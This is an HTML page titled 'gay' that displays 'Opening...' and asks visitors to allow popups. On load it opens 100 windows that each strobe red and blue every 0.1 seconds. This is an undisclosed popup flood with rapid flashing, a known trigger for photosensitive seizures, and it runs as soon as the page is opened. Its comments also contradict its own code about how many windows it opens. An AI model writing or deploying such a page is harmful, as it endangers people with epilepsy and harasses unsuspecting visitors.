<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>gay</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h1 {
            font-size: 2rem;
        }
    </style>
</head>
<body>
    <h1>Opening...</h1>
    <script>
        function checkPopupsAllowed() {
            // Try to open a test popup
            const test = window.open('about:blank', '_blank', 'width=1,height=1');
            if (test === null || typeof test === "undefined") {
                return false;
            } else {
                test.close();
                return true;
            }
        }

        function startCountdown() {
            let seconds = 1;
            const countdownElem = document.getElementById('countdown');
            const interval = setInterval(() => {
                seconds--;
                if (countdownElem) countdownElem.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(interval);

                    // Open 200 `about:blank` windows
                    const popups = [];
                    for (let i = 0; i < 100; i++) {
                        const popup = window.open(
                            'about:blank',
                            `_blank`,
                            `width=400,height=300,left=0,top=0`
                        );
                        if (popup) {
                            popups.push(popup);

                            // Write flashing lights content
                            popup.document.write(`
                                <html>
                                    <body style="margin:0;height:100vh;display:flex;justify-content:center;align-items:center;">
                                        <div id="flasher" style="width:100%;height:100%;background-color:red;"></div>
                                        <script>
                                            let isRed = true;
                                            setInterval(() => {
                                                const flasher = document.getElementById('flasher');
                                                if (flasher) {
                                                    flasher.style.backgroundColor = isRed ? 'blue' : 'red';
                                                    isRed = !isRed;
                                                }
                                            }, 100); // 0.1 seconds
                                        <\/script>
                                    </body>
                                </html>
                            `);
                        }
                    }

                    // Once all about:blank windows are opened, close the main window
                    if (popups.length === 30) {
                        window.close();
                    }
                }
            }, 1000);
        }

        window.onload = function() {
            if (checkPopupsAllowed()) {
                startCountdown();
            } else {
                const h1 = document.querySelector('h1');
                if (h1) {
                    h1.textContent = "Please allow popups and reload the page.";
                }
            }
        };
    </script>
</body>
</html>
